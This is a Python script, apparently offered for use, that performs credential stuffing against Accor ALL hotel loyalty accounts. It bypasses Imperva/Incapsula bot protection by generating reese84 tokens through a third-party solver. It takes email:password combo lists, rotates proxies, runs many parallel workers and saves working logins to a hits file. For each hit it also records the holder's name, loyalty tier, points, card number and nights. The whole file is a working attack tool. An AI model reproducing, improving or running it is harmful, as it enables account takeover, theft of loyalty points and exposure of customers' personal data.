#!/usr/bin/env python3
"""
Accor ALL (accor.com) PURE-HTTP Checker  —  No Browser Required
Uses HyperSolutions / BottingRocks Incapsula bypass for reese84 token.

This is 10-50x faster than the Playwright version because it uses raw
HTTP requests with a solved reese84 cookie — no Chrome needed at all.

Requirements:
    pip install httpx hyper-sdk

Usage:
    python accor_hyper.py
    (interactive menu — same style as accor akaza.py)

Credits: Akaza (@akaza_isnt)
"""

import asyncio
import argparse
import json
import os
import re
import sys
import time
from collections import deque
from pathlib import Path

try:
    import httpx
except ImportError:
    print("[!] httpx not installed. Run: pip install httpx")
    sys.exit(1)

try:
    import hyper_sdk
except ImportError:
    hyper_sdk = None



# ─── ANSI colors ─────────────────────────────────────────────────────────────
class C:
    RESET   = '\033[0m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    GREY    = '\033[90m'

try:
    import colorama
    colorama.just_fix_windows_console()
except Exception:
    if os.name == 'nt':
        os.system('')


# ─── Constants ────────────────────────────────────────────────────────────────
# Accor's reese84 script URL — this is static per-site (you only find it once).
# Look in DevTools → Network → filter by POST requests containing "?d=" to find it.
REESE84_SCRIPT_PATH = "/_Incapsula_Resource?SWHANEDL=NBA"
BASE_URL = "https://all.accor.com"
LOGIN_URL = "https://login.accor.com"
API_URL = "https://api.accor.com"

# Default Hyper Solutions API endpoint (from BottingRocks/Incapsula docs)
HYPER_API_URL = "https://incapsula.hypersolutions.co/reese84"

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"



# ─── CPM Tracker ──────────────────────────────────────────────────────────────
class CPMTracker:
    def __init__(self, window=60):
        self._window = window
        self._timestamps = deque()

    def hit(self):
        self._timestamps.append(time.time())

    @property
    def cpm(self):
        now = time.time()
        cutoff = now - self._window
        while self._timestamps and self._timestamps[0] < cutoff:
            self._timestamps.popleft()
        return int(len(self._timestamps) * (60 / self._window))


# ─── Reese84 Token Generator ─────────────────────────────────────────────────
async def get_reese84_cookie(session, hyper_api_key, proxy=None):
    """
    Generate a valid reese84 cookie using the HyperSolutions API.

    Flow:
    1. GET the reese84 script from Accor's site
    2. POST the script content to Hyper API → get sensor payload
    3. POST sensor payload back to Accor → get reese84 cookie

    Returns the cookie value (string) or None on failure.
    """
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        # Step 1: Fetch the reese84 script
        script_url = f"{BASE_URL}{REESE84_SCRIPT_PATH}"
        resp = await session.get(script_url, headers=headers, timeout=15)
        if resp.status_code != 200:
            return None
        script_content = resp.text


        # Step 2: Use hyper-sdk or direct API call to generate sensor
        if hyper_sdk:
            # If hyper-sdk is installed, use it directly
            try:
                session_obj = hyper_sdk.Session(USER_AGENT)
                sensor = session_obj.generate_reese84_sensor(
                    site=BASE_URL,
                    script=script_content,
                )
            except Exception:
                sensor = None
        else:
            sensor = None

        # Fallback: Direct API call to HyperSolutions
        if not sensor and hyper_api_key:
            api_payload = {
                "userAgent": USER_AGENT,
                "pageUrl": f"{BASE_URL}/a/en.html",
                "script": script_content,
                "scriptUrl": script_url,
            }
            api_headers = {
                "Content-Type": "application/json",
                "x-api-key": hyper_api_key,
            }
            api_resp = await session.post(
                HYPER_API_URL,
                json=api_payload,
                headers=api_headers,
                timeout=15,
            )
            if api_resp.status_code == 200:
                api_data = api_resp.json()
                sensor = api_data.get("payload") or api_data.get("sensor")

        if not sensor:
            return None

        # Step 3: POST sensor payload back to Accor to get reese84 cookie
        post_url = f"{BASE_URL}{REESE84_SCRIPT_PATH}?d={int(time.time()*1000)}"
        post_headers = {
            "User-Agent": USER_AGENT,
            "Content-Type": "application/json",
            "Origin": BASE_URL,
            "Referer": f"{BASE_URL}/a/en.html",
        }
        post_resp = await session.post(
            post_url,
            content=json.dumps({"sensor_data": sensor}) if isinstance(sensor, str) else json.dumps(sensor),
            headers=post_headers,
            timeout=15,
        )

        # The reese84 cookie should now be set in the session cookies
        for cookie in session.cookies.jar:
            if cookie.name == "reese84":
                return cookie.value

        # Try extracting from response
        if post_resp.status_code == 200:
            data = post_resp.json()
            token = data.get("token")
            if token:
                return token

        return None

    except Exception:
        return None



# ─── Core HTTP Login ──────────────────────────────────────────────────────────
async def check_account_http(email, password, hyper_api_key=None, proxy=None, verbose=False):
    """
    Pure-HTTP Accor account check — no browser needed.

    Flow:
    1. Generate reese84 cookie via HyperSolutions
    2. POST email to login API (check account exists)
    3. POST password to authenticate
    4. Use bearer token to fetch profile + loyalty data
    5. Capture: Name, Tier, Points, Card, Nights

    Returns result dict.
    """
    result = {
        'email': email,
        'password': password,
        'status': 'DEAD',
        'name': None,
        'tier': None,
        'points': None,
        'card': None,
        'nights': None,
        'error': None,
    }

    proxy_url = None
    if proxy:
        if proxy.get('user'):
            proxy_url = f"http://{proxy['user']}:{proxy['pass']}@{proxy['host']}:{proxy['port']}"
        else:
            proxy_url = f"http://{proxy['host']}:{proxy['port']}"

    try:
        async with httpx.AsyncClient(
            follow_redirects=True,
            timeout=20,
            proxy=proxy_url,
            headers={"User-Agent": USER_AGENT},
        ) as session:

            # Step 1: Get reese84 cookie
            if verbose:
                print(f"    [i] Generating reese84 token...")

            reese84 = await get_reese84_cookie(session, hyper_api_key, proxy)
            if not reese84:
                result['error'] = 'Failed to generate reese84 token (check API key)'
                return result

            if verbose:
                print(f"    [+] Got reese84 token: {reese84[:30]}...")

            # Set the cookie for subsequent requests
            session.cookies.set("reese84", reese84, domain=".accor.com")


            # Step 2: Submit email
            if verbose:
                print(f"    [i] Submitting email...")

            login_headers = {
                "User-Agent": USER_AGENT,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "Origin": LOGIN_URL,
                "Referer": f"{LOGIN_URL}/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            }

            email_resp = await session.post(
                f"{LOGIN_URL}/api/v2/authentication/login",
                json={"email": email},
                headers=login_headers,
                timeout=15,
            )

            if email_resp.status_code in (403, 412):
                result['error'] = 'Imperva blocked (reese84 expired/invalid)'
                return result
            if email_resp.status_code == 429:
                result['error'] = 'Rate limited (429)'
                return result

            email_data = {}
            try:
                email_data = email_resp.json()
            except Exception:
                pass

            email_text = email_resp.text.lower()
            if any(x in email_text for x in ['account_not_found', 'create_account', 'createaccount']):
                result['error'] = 'Account not found (email not registered)'
                return result

            # Step 3: Submit password
            if verbose:
                print(f"    [i] Submitting password...")

            pass_resp = await session.post(
                f"{LOGIN_URL}/api/v2/authentication/password",
                json={"email": email, "password": password},
                headers=login_headers,
                timeout=15,
            )

            if pass_resp.status_code in (403, 412):
                result['error'] = 'Imperva blocked on password step'
                return result

            pass_data = {}
            try:
                pass_data = pass_resp.json()
            except Exception:
                pass

            pass_text = pass_resp.text.lower()

            if any(x in pass_text for x in ['invalid_password', 'wrong password', 'incorrect']):
                result['error'] = 'Invalid password'
                return result
            if any(x in pass_text for x in ['locked', 'too_many_attempts', 'blocked']):
                result['error'] = 'Account locked / rate limited'
                return result


            # Step 4: Extract bearer token
            token = pass_data.get('access_token')
            if not token:
                # Try from redirect_uri or other fields
                redirect_uri = pass_data.get('redirect_uri', '')
                token_match = re.search(r'access_token=([^&]+)', redirect_uri)
                if token_match:
                    token = token_match.group(1)

            if not token:
                # Check if login was successful but token is elsewhere
                if pass_resp.status_code == 200:
                    result['status'] = 'ALIVE'
                    result['error'] = 'Login OK but no token captured'
                    return result
                result['error'] = f'Login failed (HTTP {pass_resp.status_code})'
                return result

            # SUCCESS — we have a token
            result['status'] = 'ALIVE'

            if verbose:
                print(f"    [+] LOGIN SUCCESS! Fetching profile...")

            # Step 5: Fetch profile + loyalty data
            profile_headers = {
                "User-Agent": USER_AGENT,
                "Authorization": f"Bearer {token}",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": BASE_URL,
                "Referer": f"{BASE_URL}/",
            }

            profile_resp = await session.get(
                f"{API_URL}/customer/v3/individuals/me?fields=loyalty,individual",
                headers=profile_headers,
                timeout=15,
            )

            if profile_resp.status_code == 200:
                api_data = profile_resp.json()

                # Name
                try:
                    ind_name = api_data.get('individual', {}).get('individualName', {})
                    first = ind_name.get('firstName', '')
                    last = ind_name.get('lastName', '')
                    if first or last:
                        result['name'] = f"{first} {last}".strip()
                except Exception:
                    pass

                # Card number
                try:
                    cards = api_data.get('loyalty', {}).get('loyaltyCards', {}).get('card', [])
                    if isinstance(cards, list) and cards:
                        result['card'] = str(cards[0].get('cardNumber', ''))
                    elif isinstance(cards, dict):
                        result['card'] = str(cards.get('cardNumber', ''))
                except Exception:
                    pass

                # Points
                try:
                    balances = api_data.get('loyalty', {}).get('balances', {})
                    nb_pts = balances.get('nbPoints')
                    if nb_pts is not None:
                        result['points'] = str(nb_pts)
                except Exception:
                    pass


                # Nights
                try:
                    balances = api_data.get('loyalty', {}).get('balances', {})
                    nights = balances.get('currentNightsBalance')
                    if nights is not None:
                        result['nights'] = str(nights)
                except Exception:
                    pass

                # Tier
                try:
                    TIER_MAP = {'A1': 'Classic', 'A2': 'Silver', 'A3': 'Gold',
                                'A4': 'Platinum', 'A5': 'Diamond', 'A6': 'Limitless'}
                    cards = api_data.get('loyalty', {}).get('loyaltyCards', {}).get('card', [])
                    if isinstance(cards, list) and cards:
                        code = cards[0].get('cardProduct', {}).get('cardCodeTARS', '')
                        if code in TIER_MAP:
                            result['tier'] = TIER_MAP[code]
                    if not result['tier']:
                        member_info = api_data.get('loyalty', {}).get('memberInfo', {})
                        NEXT_TO_CURRENT = {'Silver': 'Classic', 'Gold': 'Silver',
                                           'Platinum': 'Gold', 'Diamond': 'Platinum',
                                           'Limitless': 'Diamond'}
                        next_tier = member_info.get('nextTiering')
                        if next_tier and next_tier in NEXT_TO_CURRENT:
                            result['tier'] = NEXT_TO_CURRENT[next_tier]
                except Exception:
                    pass

    except httpx.TimeoutException:
        result['error'] = 'Request timeout'
    except Exception as e:
        result['error'] = str(e)[:100]

    return result



# ─── Proxy parser (same as accor akaza.py) ────────────────────────────────────
def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    for proto in ('socks5://', 'socks4://', 'https://', 'http://'):
        if proxy_str.lower().startswith(proto):
            proxy_str = proxy_str[len(proto):]
            break
    host, port, user, passwd = None, None, None, None
    if '@' in proxy_str:
        left, right = proxy_str.rsplit('@', 1)
        right_parts = right.split(':')
        left_parts = left.split(':', 1)
        if len(right_parts) == 2 and right_parts[1].isdigit():
            host, port = right_parts[0], right_parts[1]
            if len(left_parts) >= 2:
                user, passwd = left_parts[0], left_parts[1]
            else:
                user = left_parts[0]
        else:
            host = right_parts[0]
            port = right_parts[1] if len(right_parts) > 1 else '80'
            user, passwd = left_parts[0], left_parts[1] if len(left_parts) > 1 else None
    else:
        parts = proxy_str.split(':')
        if len(parts) == 2:
            host, port = parts[0], parts[1]
        elif len(parts) == 4:
            if parts[1].isdigit():
                host, port, user, passwd = parts[0], parts[1], parts[2], parts[3]
            elif parts[3].isdigit():
                user, passwd, host, port = parts[0], parts[1], parts[2], parts[3]
            else:
                host, port, user, passwd = parts[0], parts[1], parts[2], parts[3]
        elif len(parts) == 3:
            host, port, user = parts[0], parts[1], parts[2]
        else:
            return None
    if not host or not port:
        return None
    try:
        port = int(port)
    except (ValueError, TypeError):
        return None
    return {'host': host, 'port': port, 'user': user, 'pass': passwd}



# ─── Output formatting ────────────────────────────────────────────────────────
def format_result(result):
    cred = f"{result['email']}:{result['password']}"
    if result['status'] == 'ALIVE':
        parts = [f"{C.GREEN}{C.BOLD}[ALIVE]{C.RESET} {cred}"]
        if result['name']:
            parts.append(f"Name: {result['name']}")
        if result['tier']:
            parts.append(f"Tier: {result['tier']}")
        if result['points']:
            parts.append(f"Points: {result['points']}")
        if result['card']:
            parts.append(f"Card#: {result['card']}")
        if result['nights']:
            parts.append(f"Nights: {result['nights']}")
        return ' | '.join(parts)
    else:
        return f"{C.RED}[DEAD]{C.RESET} {cred} | {result.get('error', 'Unknown')}"


def format_result_plain(result):
    cred = f"{result['email']}:{result['password']}"
    if result['status'] == 'ALIVE':
        parts = [f"[ALIVE] {cred}"]
        if result['name']:
            parts.append(f"Name: {result['name']}")
        if result['tier']:
            parts.append(f"Tier: {result['tier']}")
        if result['points']:
            parts.append(f"Points: {result['points']}")
        if result['card']:
            parts.append(f"Card#: {result['card']}")
        if result['nights']:
            parts.append(f"Nights: {result['nights']}")
        return ' | '.join(parts)
    else:
        return f"[DEAD] {cred} | {result.get('error', 'Unknown')}"



# ─── Live stats ───────────────────────────────────────────────────────────────
def _print_stats(alive, dead, total, cpm, elapsed):
    mins = int(elapsed // 60)
    secs = int(elapsed % 60)
    checked = alive + dead
    remaining = total - checked
    line = (
        f"\r  {C.BOLD}{C.WHITE}[STATS]{C.RESET} "
        f"{C.GREEN}Alive:{alive}{C.RESET} "
        f"{C.RED}Dead:{dead}{C.RESET} "
        f"{C.YELLOW}CPM:{cpm}{C.RESET} "
        f"{C.CYAN}Checked:{checked}/{total}{C.RESET} "
        f"{C.GREY}Left:{remaining} | Time:{mins:02d}:{secs:02d}{C.RESET}  "
    )
    sys.stdout.write(line)
    sys.stdout.flush()


# ─── Parallel engine ──────────────────────────────────────────────────────────
async def run_checker(combo_source, proxy_arg, hyper_api_key, verbose,
                      threads=50, output_folder="Accor results"):
    """Run the parallel HTTP checker."""
    os.makedirs(output_folder, exist_ok=True)
    hits_path = os.path.join(output_folder, "hits.txt")
    bad_path = os.path.join(output_folder, "bad.txt")

    # Parse proxies
    proxy = None
    proxies = []
    if proxy_arg:
        if os.path.isfile(proxy_arg):
            with open(proxy_arg) as f:
                proxies = [parse_proxy(l) for l in f if l.strip()]
                proxies = [p for p in proxies if p]
            print(f"[*] Loaded {len(proxies)} proxies")
            proxy = proxies[0] if proxies else None
        else:
            proxy = parse_proxy(proxy_arg)
        if proxy:
            print(f"[*] Proxy: {proxy['host']}:{proxy['port']}")


    # Parse combos
    combos = []
    if combo_source:
        if os.path.isfile(combo_source):
            with open(combo_source) as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        e, pw = line.split(':', 1)
                        combos.append((e.strip(), pw.strip()))
            print(f"[*] Loaded {len(combos)} combos")
        elif ':' in combo_source:
            e, pw = combo_source.split(':', 1)
            combos.append((e.strip(), pw.strip()))

    if not combos:
        print("[!] No combos")
        return

    print(f"[*] Mode: {C.CYAN}{C.BOLD}PURE HTTP{C.RESET} (no browser)")
    print(f"[*] Threads: {C.YELLOW}{C.BOLD}{threads}{C.RESET}")
    print(f"[*] Total combos: {len(combos)}")
    sdk_status = f"{C.GREEN}hyper-sdk installed{C.RESET}" if hyper_sdk else f"{C.YELLOW}using API key{C.RESET}"
    print(f"[*] Reese84 solver: {sdk_status}")
    print()

    # Shared state
    alive = 0
    dead = 0
    lock = asyncio.Lock()
    cpm_tracker = CPMTracker(window=60)
    start_time = time.time()
    hits_file = open(hits_path, 'a')
    bad_file = open(bad_path, 'a')

    queue = asyncio.Queue()
    for i, combo in enumerate(combos):
        await queue.put((i, combo))

    async def worker(worker_id):
        nonlocal alive, dead
        while True:
            try:
                idx, (email, password) = queue.get_nowait()
            except asyncio.QueueEmpty:
                return

            try:
                px = proxies[idx % len(proxies)] if proxies else proxy
                result = await check_account_http(
                    email, password,
                    hyper_api_key=hyper_api_key,
                    proxy=px,
                    verbose=verbose,
                )
            except Exception as e:
                result = {
                    'email': email, 'password': password, 'status': 'DEAD',
                    'name': None, 'tier': None, 'points': None,
                    'card': None, 'nights': None,
                    'error': f'Worker error: {str(e)[:80]}'
                }

            async with lock:
                cpm_tracker.hit()
                if result['status'] == 'ALIVE':
                    alive += 1
                    hits_file.write(format_result_plain(result) + '\n')
                    hits_file.flush()
                    sys.stdout.write('\r' + ' ' * 90 + '\r')
                    print(f"  {format_result(result)}")
                else:
                    dead += 1
                    bad_file.write(format_result_plain(result) + '\n')
                    bad_file.flush()
                    if verbose:
                        sys.stdout.write('\r' + ' ' * 90 + '\r')
                        print(f"  {format_result(result)}")
                elapsed = time.time() - start_time
                _print_stats(alive, dead, len(combos), cpm_tracker.cpm, elapsed)

            queue.task_done()

    worker_count = min(threads, len(combos))
    tasks = [asyncio.create_task(worker(i)) for i in range(worker_count)]
    await asyncio.gather(*tasks)


    # Final stats
    elapsed = time.time() - start_time
    mins = int(elapsed // 60)
    secs = int(elapsed % 60)
    avg_cpm = int((alive + dead) / (elapsed / 60)) if elapsed > 0 else 0

    sys.stdout.write('\r' + ' ' * 90 + '\r')
    print(f"\n{'='*60}")
    print(f"  {C.BOLD}{C.WHITE}RESULTS{C.RESET}")
    print(f"  {C.GREEN}Alive: {alive}{C.RESET}  |  {C.RED}Dead: {dead}{C.RESET}  "
          f"|  Total: {len(combos)}")
    print(f"  {C.YELLOW}Average CPM: {avg_cpm}{C.RESET}  |  Time: {mins:02d}:{secs:02d}")
    print(f"  Hits saved to: {C.GREEN}{hits_path}{C.RESET}")
    print(f"  Bad saved to: {C.RED}{bad_path}{C.RESET}")
    print(f"{'='*60}")

    hits_file.close()
    bad_file.close()



# ─── Banner ───────────────────────────────────────────────────────────────────
_BANNER = r"""
  ▄▄▄       ██ ▄█▀▄▄▄      ▒███████▒ ▄▄▄
 ▒████▄     ██▄█▒▒████▄    ▒ ▒ ▒ ▄▀░▒████▄
 ▒██  ▀█▄  ▓███▄░▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██  ▀█▄
 ░██▄▄▄▄██ ▓██ █▄░██▄▄▄▄██   ▄▀▒   ░░██▄▄▄▄██
  ▓█   ▓██▒▒██▒ █▄▓█   ▓██▒▒███████▒ ▓█   ▓██▒
  ▒▒   ▓▒█░▒ ▒▒ ▓▒▒▒   ▓▒█░░░▒ ▓░▒░▒ ▒▒   ▓▒█░
   ▒   ▒▒ ░░ ░▒ ▒░ ▒   ▒▒ ░░ ░▒ ▒ ░  ▒   ▒▒ ░
   ░   ▒   ░ ░░ ░  ░   ▒   ░ ░ ░ ░ ░  ░   ▒
       ░  ░░  ░        ░  ░  ░ ░           ░  ░
"""


def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{C.CYAN}{C.BOLD}{_BANNER}{C.RESET}")
    bar = '═' * 68
    print(f"{C.CYAN}{bar}{C.RESET}")
    print(f"   {C.WHITE}{C.BOLD}AKAZA  ACCOR  HYPER CHECKER{C.RESET}   "
          f"{C.GREY}|{C.RESET}  {C.YELLOW}v3.0 (HTTP){C.RESET}  "
          f"{C.GREY}|{C.RESET}  TG: {C.YELLOW}{C.BOLD}@akaza_isnt{C.RESET}")
    print(f"   {C.MAGENTA}Pure HTTP + HyperSolutions reese84 bypass — NO BROWSER{C.RESET}")
    print(f"{C.CYAN}{bar}{C.RESET}\n")



# ─── Settings + Menu ──────────────────────────────────────────────────────────
class Settings:
    def __init__(self):
        self.combo_source  = None
        self.proxy_arg     = None
        self.hyper_api_key = None   # HyperSolutions API key
        self.threads       = 50    # default 50 for HTTP (fast!)
        self.verbose       = False

    @staticmethod
    def fmt_value(v, default='not set'):
        if v is None or v == '':
            return f"{C.DIM}{default}{C.RESET}"
        s = str(v)
        if len(s) > 42:
            s = s[:39] + '...'
        return f"{C.YELLOW}{s}{C.RESET}"

    @staticmethod
    def fmt_toggle(on):
        if on:
            return f"{C.GREEN}{C.BOLD}[ ON  ]{C.RESET}"
        return f"{C.RED}{C.BOLD}[ OFF ]{C.RESET}"


def _print_menu(s):
    show_banner()

    print(f"  {C.BOLD}{C.WHITE}CONFIG{C.RESET}")
    print(f"  {C.GREY}{'─' * 50}{C.RESET}")

    print(f"   {C.CYAN}[1]{C.RESET} Combo source ........ {s.fmt_value(s.combo_source)}")
    print(f"        {C.GREY}↪ File path (email:pass per line) or single 'email:pass'{C.RESET}")

    print(f"   {C.CYAN}[2]{C.RESET} Proxy ............... {s.fmt_value(s.proxy_arg, 'none')}")
    print(f"        {C.GREY}↪ Proxy file or single proxy string (all formats supported){C.RESET}")

    print(f"   {C.CYAN}[3]{C.RESET} Hyper API Key ....... {s.fmt_value(s.hyper_api_key, 'not set (REQUIRED)')}")
    print(f"        {C.GREY}↪ Your HyperSolutions API key for reese84 generation.{C.RESET}")
    print(f"        {C.GREY}  Get one at: https://hypersolutions.co{C.RESET}")
    print(f"        {C.GREY}  Or install 'hyper-sdk' (pip install hyper-sdk) for local solving.{C.RESET}")

    print(f"   {C.CYAN}[4]{C.RESET} Threads ............. {C.YELLOW}{C.BOLD}{s.threads}{C.RESET}")
    print(f"        {C.GREY}↪ Parallel HTTP workers. 50-100 is safe for HTTP mode.{C.RESET}")
    print(f"        {C.GREY}  More = higher CPM. This is pure HTTP — no Chrome overhead!{C.RESET}")

    print(f"   {C.CYAN}[5]{C.RESET} Verbose logs ........ {s.fmt_toggle(s.verbose)}")
    print(f"        {C.GREY}↪ Print per-step debug info for each check.{C.RESET}")

    print()
    print(f"  {C.BOLD}{C.WHITE}ACTIONS{C.RESET}")
    print(f"  {C.GREY}{'─' * 50}{C.RESET}")
    print(f"   {C.GREEN}{C.BOLD}[S]{C.RESET} Start checking         {C.GREY}— fire it up{C.RESET}")
    print(f"   {C.YELLOW}{C.BOLD}[R]{C.RESET} Reset settings         {C.GREY}— wipe to defaults{C.RESET}")
    print(f"   {C.RED}{C.BOLD}[Q]{C.RESET} Quit                   {C.GREY}— exit{C.RESET}")
    print()


def _prompt(label, default=None):
    extra = f" {C.DIM}[{default}]{C.RESET}" if default else ""
    try:
        return input(f"  {C.CYAN}>{C.RESET} {C.WHITE}{label}{extra}{C.WHITE}:{C.RESET} ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return ''


def _flash(msg, color=C.YELLOW):
    print(f"  {color}>{C.RESET} {msg}")



# ─── Menu loop ────────────────────────────────────────────────────────────────
async def menu_mode():
    s = Settings()

    while True:
        _print_menu(s)
        choice = _prompt("Choose option").lower()

        if choice == '1':
            v = _prompt("Combo file path or 'email:pass'")
            s.combo_source = v or None
            _flash("Combo updated." if v else "Cleared.")

        elif choice == '2':
            v = _prompt("Proxy file or proxy string (blank = none)")
            s.proxy_arg = v or None
            _flash("Proxy updated." if v else "Cleared.")

        elif choice == '3':
            v = _prompt("HyperSolutions API key")
            s.hyper_api_key = v or None
            _flash("API key set." if v else "Cleared.")

        elif choice == '4':
            v = _prompt("Number of threads", default=str(s.threads))
            try:
                val = int(v) if v else s.threads
                s.threads = max(1, min(500, val))
                _flash(f"Threads = {s.threads}", C.GREEN)
            except ValueError:
                _flash("Invalid number.", C.RED)

        elif choice == '5':
            s.verbose = not s.verbose
            _flash(f"Verbose: {'ON' if s.verbose else 'OFF'}",
                   C.GREEN if s.verbose else C.RED)

        elif choice == 'r':
            s = Settings()
            _flash("Reset to defaults.", C.YELLOW)

        elif choice == 's':
            if not s.combo_source:
                _flash("Set combo source first! (option [1])", C.RED)
                input(f"  {C.DIM}Press Enter...{C.RESET}")
                continue
            if not s.hyper_api_key and not hyper_sdk:
                _flash("You need either a Hyper API key [3] or 'pip install hyper-sdk'!", C.RED)
                input(f"  {C.DIM}Press Enter...{C.RESET}")
                continue

            print()
            print(f"{C.CYAN}{'─' * 68}{C.RESET}")
            await run_checker(
                s.combo_source,
                s.proxy_arg,
                s.hyper_api_key,
                s.verbose,
                threads=s.threads,
            )
            print(f"{C.CYAN}{'─' * 68}{C.RESET}")
            input(f"\n  {C.DIM}Press Enter to return to menu...{C.RESET}")

        elif choice in ('q', 'exit'):
            print(f"\n  {C.MAGENTA}{C.BOLD}> Bye! — @akaza_isnt{C.RESET}\n")
            return

        else:
            _flash("Unknown option.", C.RED)
            await asyncio.sleep(0.3)



# ─── Entry point ──────────────────────────────────────────────────────────────
async def main():
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            description='Akaza Accor HYPER Checker (Pure HTTP + reese84 bypass)',
            epilog='Run without args for interactive menu.',
        )
        parser.add_argument('-c', '--combo', help='Combo file or email:pass')
        parser.add_argument('-p', '--proxy', help='Proxy file or single proxy')
        parser.add_argument('-k', '--key', help='HyperSolutions API key')
        parser.add_argument('-t', '--threads', type=int, default=50, help='Parallel workers (default 50)')
        parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
        args = parser.parse_args()

        await run_checker(
            args.combo, args.proxy, args.key,
            args.verbose, threads=args.threads,
        )
    else:
        await menu_mode()


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n  {C.MAGENTA}> Interrupted. Bye!{C.RESET}")
